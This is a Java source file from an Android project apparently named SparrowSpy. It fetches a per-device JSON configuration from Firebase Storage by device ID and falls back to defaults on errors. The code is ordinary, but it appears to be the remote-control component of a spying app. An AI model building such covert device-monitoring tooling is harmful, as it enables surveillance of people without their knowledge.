package com.tangledbytes.sparrowspy.server;

import android.content.Context;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.SparrowConfiguration;
import com.tangledbytes.sparrowspy.utils.Utils;

import org.json.JSONException;
import org.json.JSONObject;

public class SparrowConfigManager {
    private static final String TAG = "SparrowConfigManager";
    private final Context mContext;

    public interface OnConfigFetchedListener {
        void onComplete(SparrowConfiguration config);
    }

    // Constructor
    public SparrowConfigManager(Context ctx) {
        mContext = ctx;
    }

    // Pull configuration from server
    public void fetchConfiguration(OnConfigFetchedListener listener) {
        FirebaseStorage storage = FirebaseManager.getFirebaseStorage();
        StorageReference rootRef = storage.getReference(Constants.FS_DEVICES).child(new Utils(mContext).getDeviceId());
        StorageReference configRef = rootRef.child(Constants.CONFIG_FILE_NAME);

        Log.i(TAG, "Pulling config from server");

        configRef.getMetadata().addOnSuccessListener(storageMetadata -> configRef.getBytes(storageMetadata.getSizeBytes()).addOnSuccessListener(bytes -> {
            try {
                JSONObject jsonObject = new JSONObject(new String(bytes));
                listener.onComplete(SparrowConfiguration.fromJSON(jsonObject));
            } catch (JSONException e) {
                Log.e(TAG, "Failed to parse config from server", e);
                listener.onComplete(SparrowConfiguration.getDefaultConfig());
            }
        }).addOnFailureListener(e -> {
            Log.e(TAG, "Failed to pull config from server", e);
            listener.onComplete(SparrowConfiguration.getDefaultConfig());
        })).addOnFailureListener(e -> {
            Log.e(TAG, "Config file does not exist or failed to fetch metadata", e);
            listener.onComplete(SparrowConfiguration.getDefaultConfig());
        });
    }

    // Push configuration to server (not implemented)
    public static void pushConfig(JSONObject config) {
        throw new UnsupportedOperationException("Push configuration not implemented");
    }
}